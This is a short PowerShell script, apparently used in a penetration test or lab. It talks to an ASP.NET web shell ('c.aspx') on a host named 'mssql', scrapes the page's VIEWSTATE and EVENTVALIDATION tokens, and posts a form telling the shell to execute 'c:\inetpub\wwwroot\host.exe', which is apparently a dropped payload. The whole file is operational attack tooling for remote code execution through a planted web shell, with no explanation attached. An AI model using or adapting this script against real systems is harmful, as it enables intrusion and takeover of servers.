Add-Type -AssemblyName System.Web 
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' 
$url = 'http://mssql/c.aspx' 
  
$r=Invoke-WebRequest -Uri $url -SessionVariable RequestForm -UseBasicParsing 
$htmlContent = Invoke-WebRequest -Uri $url -WebSession $RequestForm -UseBasicParsing | select -ExpandProperty inputfields | select name, value 
  
$viewstate = $htmlContent |  ?{$_.name -match "VIEWSTATE$"} | select -ExpandProperty value 
$eventvalidation = $htmlContent | ?{$_.name -match "EVENTVALIDATION"} | select -ExpandProperty value 
$viewstategenerator = $htmlContent | ?{$_.name -match "VIEWSTATEGENERATOR"} | select -ExpandProperty value 
  
$secondFormData = @{ 
    "__VIEWSTATE" = $viewstate 
    "__VIEWSTATEGENERATOR" = $viewstategenerator 
    "__EVENTVALIDATION" = $eventvalidation 
    "txtArg" = "c:\inetpub\wwwroot\host.exe" 
    "testing" = "execute" 
} 
$encodedFormData = @() 
foreach ($key in $secondFormData.Keys) { 
    $encodedKey = [System.Web.HttpUtility]::UrlEncode($key) 
    $encodedValue = [System.Web.HttpUtility]::UrlEncode($secondFormData[$key]) 
    $encodedPair = "$encodedKey=$encodedValue" 
    $encodedFormData += $encodedPair 
} 
$encodedFormData = $encodedFormData -join '&' 
$secondResponse = Invoke-WebRequest -UseBasicParsing -Uri $url -WebSession $RequestForm -Method POST -Body $encodedFormData -ContentType "application/x-www-form-urlencoded" 
$secondResponse.Content 
# Check if the second request was successful 
if ($secondResponse.StatusCode -eq 200) { 
    Write-Host "Second request was successful." 
} else { 
    Write-Host "Second request failed with status code $($secondResponse.StatusCode)" 
} 
